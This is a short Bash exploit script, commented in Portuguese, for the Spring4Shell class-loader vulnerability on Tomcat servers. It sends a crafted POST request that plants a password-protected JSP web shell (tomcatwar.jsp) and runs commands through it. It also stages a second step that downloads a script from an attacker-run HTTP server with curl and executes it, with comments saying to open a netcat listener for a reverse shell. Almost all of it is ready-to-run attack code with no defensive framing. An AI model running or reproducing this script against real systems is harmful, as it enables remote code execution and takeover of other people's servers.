#!/bin/bash

#abra a porta 80 localmente com nc -nlvp 80
#suba um server em python antes de rodar o exploit na porta 8081
#python -m http.server 8081

echo "Qual o ip ?"
read ip

data="test?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=";

curl -X POST http://$ip:8080/$data --silent -H "suffix: %>//" -H "c1: Runtime" -H "c2: <%" -H "Content-Type: application/x-www-form-urlencoded" > /dev/null

firefox view-source:http://$ip:8080/tomcatwar.jsp?pwd\=j\&cmd\=whoami

echo "RCE CONCLUIDO COM SUCESSO :)"

payload="curl 10.0.0.30:8081/bash -o /bash"
shell="bash /bash"

#firefox http://$ip:8080/tomcatwar.jsp?pwd\=j\&cmd\=$payload
#firefox http://$ip:8080/tomcatwar.jsp?pwd\=j\&cmd\=$shell
